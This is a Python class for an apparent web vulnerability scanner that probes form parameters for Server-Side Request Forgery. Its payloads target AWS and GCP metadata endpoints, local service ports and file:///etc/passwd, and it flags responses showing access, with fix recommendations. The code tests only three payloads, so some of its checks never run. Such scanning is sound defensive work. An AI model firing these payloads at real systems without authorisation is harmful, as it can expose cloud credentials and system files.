import asyncio
from urllib.parse import urljoin

class SSRFTester:
    """Test for Server-Side Request Forgery using discovered parameters"""
    
    def __init__(self):
        self.ssrf_payloads = [
            'http://169.254.169.254/',  # AWS metadata
            'http://metadata.google.internal/',  # GCP metadata
            'http://localhost:22',  # Local SSH
            'http://127.0.0.1:3306',  # Local MySQL
            'http://[::1]:80',  # IPv6 localhost
            'file:///etc/passwd',  # File protocol
            'http://httpbin.org/get'  # External callback
        ]
        self.url_params = ['url', 'redirect', 'next', 'link', 'site', 'goto', 'target']
    
    async def test_ssrf(self, session, parameters):
        """Test discovered parameters for SSRF vulnerabilities"""
        findings = []
        
        for url, forms in parameters.items():
            for form in forms:
                for input_field in form['inputs']:
                    param_name = input_field['name'].lower()
                    
                    # Only test parameters that might accept URLs
                    if any(keyword in param_name for keyword in self.url_params):
                        ssrf_findings = await self._test_parameter_ssrf(
                            session, form, input_field
                        )
                        findings.extend(ssrf_findings)
        
        return findings
    
    async def _test_parameter_ssrf(self, session, form, input_field):
        """Test individual parameter for SSRF"""
        findings = []
        
        for payload in self.ssrf_payloads[:3]:  # Limit payloads to avoid overwhelming
            try:
                data = {input_field['name']: payload}
                
                if form['method'].lower() == 'post':
                    async with session.post(form['action'], data=data, timeout=10) as response:
                        result = await self._analyze_ssrf_response(response, payload, form, input_field)
                        if result:
                            findings.append(result)
                            break  # Stop on first successful SSRF
                else:
                    params = {input_field['name']: payload}
                    async with session.get(form['action'], params=params, timeout=10) as response:
                        result = await self._analyze_ssrf_response(response, payload, form, input_field)
                        if result:
                            findings.append(result)
                            break  # Stop on first successful SSRF
                            
                # Small delay between requests
                await asyncio.sleep(0.5)
                
            except asyncio.TimeoutError:
                # Timeout might indicate SSRF to internal service
                if 'localhost' in payload or '127.0.0.1' in payload:
                    findings.append({
                        'type': 'Potential SSRF (Timeout)',
                        'severity': 'MEDIUM',
                        'url': form['action'],
                        'parameter': input_field['name'],
                        'payload': payload,
                        'description': f'Request timeout when accessing {payload} - possible SSRF',
                        'recommendation': 'Implement URL validation and whitelist allowed destinations'
                    })
                    break
            except Exception:
                continue
        
        return findings
    
    async def _analyze_ssrf_response(self, response, payload, form, input_field):
        """Analyze response for SSRF indicators"""
        try:
            content = await response.text()
            
            # Check for metadata service responses
            if 'metadata.google.internal' in payload and 'computeMetadata' in content:
                return {
                    'type': 'SSRF to GCP Metadata',
                    'severity': 'CRITICAL',
                    'url': form['action'],
                    'parameter': input_field['name'],
                    'payload': payload,
                    'description': 'Successfully accessed GCP metadata service',
                    'recommendation': 'Implement strict URL validation and disable access to metadata services'
                }
            
            if '169.254.169.254' in payload and ('ami-id' in content or 'instance-id' in content):
                return {
                    'type': 'SSRF to AWS Metadata',
                    'severity': 'CRITICAL',
                    'url': form['action'],
                    'parameter': input_field['name'],
                    'payload': payload,
                    'description': 'Successfully accessed AWS metadata service',
                    'recommendation': 'Implement strict URL validation and disable access to metadata services'
                }
            
            # Check for file protocol access
            if payload.startswith('file://') and ('root:' in content or '/bin/bash' in content):
                return {
                    'type': 'SSRF File Access',
                    'severity': 'HIGH',
                    'url': form['action'],
                    'parameter': input_field['name'],
                    'payload': payload,
                    'description': 'Successfully accessed local files via file:// protocol',
                    'recommendation': 'Disable file:// protocol and implement URL scheme validation'
                }
            
            # Check for external callback
            if 'httpbin.org' in payload and response.status == 200:
                return {
                    'type': 'SSRF External Request',
                    'severity': 'HIGH',
                    'url': form['action'],
                    'parameter': input_field['name'],
                    'payload': payload,
                    'description': 'Server made external HTTP request - confirmed SSRF',
                    'recommendation': 'Implement URL validation and restrict outbound requests'
                }
                
        except Exception:
            pass
            
        return None